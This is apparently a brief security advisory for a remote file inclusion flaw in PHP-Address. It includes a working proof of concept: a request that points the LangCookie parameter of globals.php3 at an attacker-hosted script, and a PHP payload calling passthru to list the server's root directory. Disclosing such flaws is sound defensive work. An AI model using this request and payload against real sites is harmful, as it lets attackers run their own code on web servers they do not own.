PHP-Address is prone to an issue which may allow remote attackers to include arbitrary files located on remote servers. If the remote file is a PHP script, this may allow for execution of attacker-supplied PHP code with the privileges of the webserver.

http://SERVER/globals.php3?LangCookie=http://MYSERVER/x
(the .php3 is already there look at line 5 in global.php3)

Remote script located on MYSERVER:

------------x.php3------------
<?
passthru("/bin/ls /");
?>
-------------------------------

Outputs a directory listing.
